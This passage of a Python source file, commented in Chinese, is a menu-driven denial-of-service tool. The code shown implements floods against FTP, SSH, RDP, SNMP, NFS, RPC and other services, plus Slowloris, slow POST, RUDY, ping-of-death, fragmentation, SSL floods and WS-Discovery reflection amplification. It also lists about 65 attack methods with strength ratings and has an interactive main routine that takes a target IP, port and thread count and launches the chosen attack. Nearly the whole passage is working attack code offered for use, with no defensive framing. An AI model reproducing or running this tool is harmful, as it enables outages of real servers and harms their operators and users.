    target_port: 目标 FTP 服务器的端口号（FTP 默认端口是 21）
    count: 发送请求的数量
    """
    def attack():
        try:
            # 创建 TCP 连接到目标 FTP 服务器
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((target_ip, target_port))

            # 接收 FTP 服务器的欢迎信息
            welcome_msg = client.recv(1024)
            print(f"收到欢迎信息: {welcome_msg.decode()}")

            # 发送一个伪造的用户名和密码进行登录
            client.send(b"USER anonymous\r\n")
            client.recv(1024)  # 等待服务器响应

            client.send(b"PASS anonymous\r\n")
            client.recv(1024)  # 等待服务器响应

            # 一直保持连接活跃
            while True:
                client.send(b"NOOP\r\n")  # 发送空操作命令
                client.recv(1024)  # 等待回应

            client.close()
            
        except Exception as e:
            print(f"发送请求失败: {e}")

    # 启动多线程进行攻击
    threads = []
    for _ in range(count):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    # 等待所有线程完成
    for thread in threads:
        thread.join()

    print(f"FTP Flood 攻击已完成，发送了 {count} 个请求到 {target_ip}:{target_port}")


def ssh_flood(target_ip, target_port, count):
    """
    SSH Flood 攻击函数，通过向目标 SSH 服务器发送大量的连接请求，消耗服务器资源。

    target_ip: 目标 SSH 服务器的 IP 地址
    target_port: 目标 SSH 服务器的端口号（SSH 默认端口是 22）
    count: 发送请求的数量
    """
    def attack():
        try:
            # 创建 TCP 连接到目标 SSH 服务器
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((target_ip, target_port))

            # 发送 SSH 协议的初始握手请求
            ssh_handshake = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            client.send(ssh_handshake)
            
            # 接收服务器的响应
            response = client.recv(1024)
            print(f"收到响应: {response}")

            # 一直保持连接活跃
            while True:
                client.send(b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")  # 发送空的数据
                client.recv(1024)  # 等待回应

            client.close()

        except Exception as e:
            print(f"发送请求失败: {e}")

    # 启动多线程进行攻击
    threads = []
    for _ in range(count):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    # 等待所有线程完成
    for thread in threads:
        thread.join()

    print(f"SSH Flood 攻击已完成，发送了 {count} 个请求到 {target_ip}:{target_port}")


def rdp_flood(target_ip, target_port, count):
    """
    RDP Flood 攻击函数，通过向目标 RDP 服务器发送大量的连接请求，消耗服务器资源。

    target_ip: 目标 RDP 服务器的 IP 地址
    target_port: 目标 RDP 服务器的端口号（默认端口是 3389）
    count: 发送请求的数量
    """
    def attack():
        try:
            # 创建 TCP 连接到目标 RDP 服务器
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((target_ip, target_port))

            # 发送 RDP 协议的初始请求数据
            rdp_handshake = b"\x03\x00\x00\x13\x13\x00\x00\x00\x00\x00\x00\x00"  # 简单的 RDP 握手数据
            client.send(rdp_handshake)

            # 保持连接并发送数据
            while True:
                client.send(b"\x00\x00\x00\x00\x00\x00\x00\x00")  # 向服务器发送空数据包
                client.recv(1024)  # 等待服务器回应

            client.close()

        except Exception as e:
            print(f"发送请求失败: {e}")

    # 启动多线程进行攻击
    threads = []
    for _ in range(count):
        thread = threading.Thread(target=attack)
        threads.append(thread)
        thread.start()

    # 等待所有线程完成
    for thread in threads:
        thread.join()

    print(f"RDP Flood 攻击已完成，发送了 {count} 个请求到 {target_ip}:{target_port}")


def snmp_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    for _ in range(count):
        # 构造SNMP请求数据包
        snmp_request = b"SNMP Flood Attack\r\n"
        client.send(snmp_request)
        time.sleep(random.uniform(0.01, 0.1))  # 随机延迟，模拟真实流量

    print(f"SNMP泛洪攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")



def bittorrent_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    # Bittorrent协议的基础请求数据（假设为标准请求）
    bittorrent_request = b"GET /announce?info_hash=%s&peer_id=%s&port=%d&uploaded=0&downloaded=0&left=100000000 HTTP/1.1\r\n" \
                         b"Host: %s\r\n" \
                         b"User-Agent: Python Bittorrent Flood\r\n" \
                         b"Connection: keep-alive\r\n" \
                         b"Accept-Encoding: gzip, deflate\r\n\r\n"

    # 模拟Bittorrent请求发送
    for _ in range(count):
        # 随机生成info_hash和peer_id（模拟一个随机请求）
        info_hash = ''.join(random.choice('0123456789abcdef') for _ in range(40)).encode('utf-8')
        peer_id = ''.join(random.choice('0123456789abcdef') for _ in range(20)).encode('utf-8')
        # 随机生成端口
        port = random.randint(6881, 6889)
        
        # 发送构造的Bittorrent请求
        client.send(bittorrent_request % (info_hash, peer_id, port, target_ip))
        time.sleep(random.uniform(0.01, 0.1))  # 模拟随机的请求间隔

    print(f"Bittorrent泛洪攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def nfs_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    # 模拟NFS请求数据包（假设为NFS请求）
    nfs_request = b"NFS Flood Attack: /mnt/nfs_share\r\n"

    for _ in range(count):
        # 发送构造的NFS请求
        client.send(nfs_request)
        time.sleep(random.uniform(0.01, 0.1))  # 模拟请求间隔（避免短时间内发出大量请求）

    print(f"NFS泛洪攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def rpc_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    # 模拟RPC请求数据包（RPC请求数据通常具有特定格式，以下是简化版本）
    rpc_request = b"RPC Flood Attack: CallRemoteProcedure\r\n"

    for _ in range(count):
        # 发送构造的RPC请求
        client.send(rpc_request)
        time.sleep(random.uniform(0.01, 0.1))  # 模拟请求间隔（避免短时间内发出大量请求）

    print(f"RPC泛洪攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def ipv6_flood(target_ip, target_port, count):
    client = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    client.connect((target_ip, target_port))

    # 生成IPv6数据包（简单模拟）
    ipv6_packet = b"IPv6 Flood Attack: Random Data\r\n"

    for _ in range(count):
        # 发送IPv6数据包
        client.send(ipv6_packet)
        time.sleep(random.uniform(0.01, 0.1))  # 模拟请求间隔（避免过于集中发送）
    
    print(f"IPv6 Flood攻击已对 {target_ip} 端口 {target_port} 完成 {count} 次请求")


def slowloris(target_ip, target_port, count):
    sockets = []
    for _ in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {TARGET_WEBSITE}\r\n".encode())
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            s.send(b"Connection: keep-alive\r\n")
            sockets.append(s)
        except:
            pass
    while True:
        for s in sockets:
            try:
                s.send(f"X-a: {random.randint(0, 9999)}\r\n".encode())
            except:
                sockets.remove(s)
        time.sleep(15)

def http_slow_post(target_ip, target_port, count):
    headers = f"POST / HTTP/1.1\r\nHost: {TARGET_WEBSITE}\r\n"
    headers += "Content-Length: 1000000\r\n"
    headers += "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
    
    for _ in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(headers.encode())
            while True:
                s.send(b"a=" + random._urandom(10) + b"&")
                time.sleep(100)
        except:
            s.close()

def icmp_flood(target_ip, _, count):
    packet = IP(dst=target_ip)/ICMP()/("x"*60000)
    for _ in range(count):
        send(packet, verbose=0)

def rudy_attack(target_ip, target_port, count):
    payload = "POST / HTTP/1.1\r\n"
    payload += f"Host: {TARGET_WEBSITE}\r\n"
    payload += "Content-Length: 10000000\r\n"
    payload += "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
    
    for _ in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(payload.encode())
            while True:
                s.send(b"a=" + random._urandom(10) + b"&")
                time.sleep(100)
        except:
            s.close()

def loic_attack(target_ip, target_port, count):
    for _ in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(random._urandom(1024))
        except:
            s.close()

def xmas_attack(target_ip, _, count):
    packet = IP(dst=target_ip)/TCP(dport=random.randint(1,65535), flags="FPU")
    for _ in range(count):
        send(packet, verbose=0)

def ping_of_death(target_ip, _, count):
    for _ in range(count//THREAD_COUNT):
        send(IP(dst=target_ip)/ICMP()/("X"*60000), verbose=0)

def ip_fragmentation_flood(target_ip, _, count):
    for _ in range(count//THREAD_COUNT):
        send(IP(dst=target_ip, flags="MF", frag=0)/ICMP()/("X"*66000), verbose=0)

def ssl_flood(target_ip, target_port, count):
    for _ in range(count//THREAD_COUNT):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            s.send(b"\x16\x03\x01\x02\x00\x01\x00\x01\xfc\x03\x03")
            time.sleep(0.5)
        except: pass

def wsdd_reflection(target_ip, _, count):
    with open("wsdd_servers.txt") as f:
        servers = [line.strip() for line in f]
    payload = (
        b'<?xml version="1.0" encoding="UTF-8"?>'
        b'<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" '
        b'xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing">'
        b'<soap:Header><wsa:To>urn:schemas-xmlsoap-org:ws:2005:04:discovery</wsa:To>'
        b'<wsa:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</wsa:Action>'
        b'<wsa:MessageID>uuid:00000000-0000-0000-0000-000000000000</wsa:MessageID>'
        b'</soap:Header><soap:Body><Probe xmlns="http://schemas.xmlsoap.org/ws/2005/04/discovery">'
        b'<Types>dp0:PrintBasic</Types><Scopes /></Probe></soap:Body></soap:Envelope>'
    )
    for _ in range(count//THREAD_COUNT):
        for server in servers:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (server, 3702))
            sock.close()














attack_methods = [
    {"name": "SYN泛洪", "description": "通过发送大量伪造的TCP连接请求，使被攻击主机资源耗尽。", "strength": 90},
    {"name": "UDP泛洪", "description": "向目标发送大量UDP数据包，消耗带宽和资源。", "strength": 85},
    {"name": "HTTP GET泛洪", "description": "发送大量HTTP GET请求，消耗Web服务器资源。", "strength": 80},
    {"name": "HTTP POST泛洪", "description": "发送大量HTTP POST请求，消耗Web服务器资源。", "strength": 80},
    {"name": "DNS放大攻击", "description": "利用DNS服务器的反射特性，放大攻击流量。", "strength": 95},
    {"name": "NTP放大攻击", "description": "利用NTP服务器的反射特性，放大攻击流量。", "strength": 90},
    {"name": "Chargen放大攻击", "description": "利用Chargen服务的反射特性，放大攻击流量。", "strength": 85},
    {"name": "SSDP放大攻击", "description": "利用SSDP协议的反射特性，放大攻击流量。", "strength": 80},
    {"name": "SNMP放大攻击", "description": "利用SNMP协议的反射特性，放大攻击流量。", "strength": 75},
    {"name": "Memcached放大攻击", "description": "利用Memcached服务的反射特性，放大攻击流量。", "strength": 100},
    {"name": "CLDAP放大攻击", "description": "利用CLDAP协议的反射特性，放大攻击流量。", "strength": 85},
    {"name": "LDAP放大攻击", "description": "利用LDAP协议的反射特性，放大攻击流量。", "strength": 80},
    {"name": "RIP放大攻击", "description": "利用RIP协议的反射特性，放大攻击流量。", "strength": 75},
    {"name": "Chargen反射攻击", "description": "利用Chargen服务的反射特性，放大攻击流量。", "strength": 70},
    {"name": "DNS查询泛洪", "description": "发送大量DNS查询请求，消耗DNS服务器资源。", "strength": 85},
    {"name": "ICMP回显请求泛洪", "description": "发送大量ICMP回显请求，消耗目标带宽。", "strength": 80},
    {"name": "ICMP重定向泛洪", "description": "发送大量ICMP重定向消息，干扰网络路由。", "strength": 75},
    {"name": "ICMP时间戳请求泛洪", "description": "发送大量ICMP时间戳请求，消耗目标带宽。", "strength": 70},
    {"name": "ICMP地址掩码请求泛洪", "description": "发送大量ICMP地址掩码请求，消耗目标带宽。", "strength": 65},
    {"name": "TCP连接耗尽攻击", "description": "通过大量TCP连接请求，消耗目标服务器资源。", "strength": 90},
    {"name": "TCP连接重置攻击", "description": "发送大量TCP连接重置包，干扰正常连接。", "strength": 85},
    {"name": "TCP连接半开攻击", "description": "发送大量SYN包，消耗目标服务器资源。", "strength": 80},
    {"name": "TCP连接全开攻击", "description": "发送大量SYN-ACK包，消耗目标服务器资源。", "strength": 75},
    {"name": "HTTP请求头泛洪", "description": "发送大量HTTP请求头，消耗Web服务器资源。", "strength": 70},
    {"name": "HTTP请求体泛洪", "description": "发送大量HTTP请求体，消耗Web服务器资源。", "strength": 65},
    {"name": "HTTP Cookie泛洪", "description": "发送大量HTTP请求，包含大量Cookie，消耗Web服务器资源。", "strength": 60},
    {"name": "HTTP Referer泛洪", "description": "发送大量HTTP请求，包含大量Referer，消耗Web服务器资源。", "strength": 55},
    {"name": "HTTP User-Agent泛洪", "description": "发送大量HTTP请求，包含大量User-Agent，消耗Web服务器资源。", "strength": 50},
    {"name": "HTTP Host泛洪", "description": "发送大量HTTP请求，包含大量Host，消耗Web服务器资源。", "strength": 45},
    {"name": "HTTP Accept泛洪", "description": "发送大量HTTP请求，包含大量Accept，消耗Web服务器资源。", "strength": 40},
    {"name": "HTTP Accept-Encoding泛洪", "description": "发送大量HTTP请求，包含大量Accept-Encoding，消耗Web服务器资源。", "strength": 35},
    {"name": "HTTP Accept-Language泛洪", "description": "发送大量HTTP请求，包含大量Accept-Language，消耗Web服务器资源。", "strength": 30},
    {"name": "HTTP Connection泛洪", "description": "发送大量HTTP请求，包含大量Connection，消耗Web服务器资源。", "strength": 25},
    {"name": "HTTP Upgrade泛洪", "description": "发送大量HTTP请求，包含大量Upgrade，消耗Web服务器资源。", "strength": 20},
    {"name": "HTTP Cache-Control泛洪", "description": "发送大量HTTP请求，包含大量Cache-Control，消耗Web服务器资源。", "strength": 15},
    {"name": "HTTP Pragma泛洪", "description": "发送大量HTTP请求，包含大量Pragma，消耗Web服务器资源。", "strength": 10},
    {"name": "HTTP DNT泛洪", "description": "发送大量HTTP请求，包含大量DNT，消耗Web服务器资源。", "strength": 5},
    {"name": "HTTP TE泛洪", "description": "发送大量HTTP请求，包含大量TE，消耗Web服务器资源。", "strength": 5},
    {"name": "带宽消耗攻击", "description": "通过大量数据包消耗目标带宽，使目标无法正常处理请求。", "strength": 80},
    {"name": "HTTP DoS攻击", "description": "发送大量HTTP请求，消耗Web服务器的处理能力。", "strength": 75},
    {"name": "WebSocket泛洪", "description": "通过WebSocket协议持续发送大量数据包，消耗服务器资源。", "strength": 70},
    {"name": "SMTP泛洪", "description": "向目标SMTP服务器发送大量邮件，消耗邮件服务器资源。", "strength": 65},
    {"name": "POP3泛洪", "description": "向目标POP3邮件服务器发送大量请求，消耗资源。", "strength": 60},
    {"name": "IMAP泛洪", "description": "向目标IMAP邮件服务器发送大量请求，消耗资源。", "strength": 55},
    {"name": "Telnet泛洪", "description": "向目标Telnet服务发送大量连接请求，消耗资源。", "strength": 50},
    {"name": "FTP泛洪", "description": "向目标FTP服务发送大量连接请求，消耗资源。", "strength": 45},
    {"name": "SSH泛洪", "description": "向目标SSH服务发送大量连接请求，消耗资源。", "strength": 40},
    {"name": "RDP泛洪", "description": "向目标RDP服务发送大量连接请求，消耗资源。", "strength": 35},
    {"name": "SNMP泛洪", "description": "向目标SNMP服务发送大量请求，消耗目标网络资源。", "strength": 30},
    {"name": "ICMP重定向泛洪", "description": "通过大量ICMP重定向消息干扰网络流量。", "strength": 25},
    {"name": "BitTorrent泛洪", "description": "通过BitTorrent协议向目标发送大量数据包，消耗带宽资源。", "strength": 20},
    {"name": "NFS泛洪", "description": "向目标NFS服务器发送大量请求，消耗资源。", "strength": 15},
    {"name": "RPC泛洪", "description": "向目标RPC服务发送大量请求，消耗资源。", "strength": 10},
    {"name": "IPv6泛洪", "description": "通过IPv6协议发送大量数据包，消耗目标带宽。", "strength": 5},
    {"name": "Slowloris攻击", "description": "保持大量HTTP连接不释放消耗服务器资源", "strength": 95},
    {"name": "HTTP慢速POST", "description": "缓慢发送POST请求消耗服务器连接", "strength": 90},
    {"name": "ICMP洪水攻击", "description": "发送大量ICMP请求消耗带宽", "strength": 85},
    {"name": "RUDY攻击", "description": "超慢速表单提交攻击", "strength": 88},
    {"name": "LOIC攻击", "description": "高强度泛洪攻击", "strength": 100},
    {"name": "XMAS攻击", "description": "发送特殊标志TCP包消耗资源", "strength": 75},
    {"name": "Ping死亡攻击", "description": "发送超大ICMP数据包导致系统崩溃", "strength": 100},
    {"name": "分片洪水攻击", "description": "发送大量IP分片数据包消耗资源", "strength": 85},
    {"name": "SSL洪水攻击", "description": "消耗SSL/TLS握手资源", "strength": 80},
    {"name": "WS-DD反射攻击", "description": "利用WS-Discovery协议反射放大", "strength": 95}
]


# 攻击方式的映射字典
attack_functions = {
    "SYN泛洪": syn_flood,
    "UDP泛洪": udp_flood,
    "HTTP GET泛洪": http_get_flood,
    "HTTP POST泛洪": http_post_flood,
    "DNS放大攻击": dns_amplification,
    "NTP放大攻击": ntp_amplification,
    "Chargen放大攻击": chargen_amplification,
    "SSDP放大攻击": ssdp_amplification,
    "SNMP放大攻击": snmp_amplification,
    "Memcached放大攻击": memcached_amplification,
    "CLDAP放大攻击": cldap_amplification,
    "LDAP放大攻击": ldap_amplification,
    "RIP放大攻击": rip_amplification,
    "Chargen反射攻击": chargen_reflection,
    "DNS查询泛洪": dns_query_flood,
    "ICMP回显请求泛洪": icmp_echo_flood,
    "ICMP重定向泛洪": icmp_redirect_flood,
    "ICMP时间戳请求泛洪": icmp_timestamp_flood,
    "ICMP地址掩码请求泛洪": icmp_mask_flood,
    "TCP连接耗尽攻击": tcp_connection_exhaustion,
    "TCP连接重置攻击": tcp_reset_attack,
    "TCP连接半开攻击": syn_flood,
    "TCP连接全开攻击": syn_ack_flood,
    "HTTP请求头泛洪": http_header_flood,
    "HTTP请求体泛洪": http_body_flood,
    "HTTP Cookie泛洪": http_cookie_flood,
    "HTTP Referer泛洪": http_referer_flood,
    "HTTP User-Agent泛洪": http_user_agent_flood,
    "HTTP Host泛洪": http_host_flood,
    "HTTP Accept泛洪": http_accept_flood,
    "HTTP Accept-Encoding泛洪": http_accept_encoding_flood,
    "HTTP Connection泛洪": http_connection_flood,
    "HTTP TE泛洪": http_te_flood,
    "HTTP Upgrade泛洪": http_upgrade_flood,
    "HTTP Cache-Control泛洪": http_cache_control_flood,
    "HTTP Pragma泛洪": http_pragma_flood,
    "HTTP Expect泛洪": http_expect_flood,
    "HTTP From泛洪": http_from_flood,
    "HTTP DNT泛洪": http_dnt_flood,
    "HTTP TE-Proxy泛洪": http_te_proxy_flood,
    "带宽消耗攻击": bandwidth_consumption_attack,
    "HTTP DoS攻击": http_dos_attack,
    "WebSocket泛洪": websocket_flood,
    "SMTP泛洪": smtp_flood,
    "POP3泛洪": pop3_flood,
    "IMAP泛洪": imap_flood,
    "Telnet泛洪": telnet_flood,
    "FTP泛洪": ftp_flood,
    "SSH泛洪": ssh_flood,
    "RDP泛洪": rdp_flood,
    "SNMP泛洪": snmp_flood,
    "ICMP重定向泛洪": icmp_redirect_flood,
    "BitTorrent泛洪": bittorrent_flood,
    "NFS泛洪": nfs_flood,
    "RPC泛洪": rpc_flood,
    "IPv6泛洪": ipv6_flood,
    "Slowloris攻击": slowloris,
    "HTTP慢速POST": http_slow_post,
    "ICMP洪水攻击": icmp_flood,
    "RUDY攻击": rudy_attack,
    "LOIC攻击": loic_attack,
    "XMAS攻击": xmas_attack,
    "Ping死亡攻击": ping_of_death,
    "分片洪水攻击": ip_fragmentation_flood,
    "SSL洪水攻击": ssl_flood,
    "WS-DD反射攻击": wsdd_reflection
}


# 显示所有攻击方式及其描述
def show_attack_methods():
    print("\n攻击方式列表及说明：")
    for i, method in enumerate(attack_functions.keys(), 1):
        print(f"{i}. {method}")

# 执行攻击
def execute_attack(target_ip, target_port, attack_method, count):
    attack_func = attack_functions.get(attack_method)
    if attack_func:
        attack_func(target_ip, target_port, count)






# 主程序，用户选择攻击方式并输入相关参数
def main():
    global THREAD_COUNT
    target_ip = input("目标IP：")
    target_port = int(input("目标端口："))
    target_website = input("目标网站：")
    THREAD_COUNT = int(input("线程数："))
    require_count = int(input("单线程请求次数："))
    packet_size = int(input("每个数据包的大小（字节）"))
    request_size = packet_size
    
    
    print("\n可用攻击方法:")
    for i, method in enumerate(attack_methods, 1):
        print(f"{i}. {method['name']} - {method['description']}")
    
    choice = int(input("选择攻击方法编号: "))-1
    method = attack_methods[choice]
    
    print(f"\n启动 {method['name']} 攻击...")
    threads = []
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=attack_handler, args=(
            attack_functions[method['name']],
            target_ip,
            target_port,
            require_count  # 每个线程发送次数
        ))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()


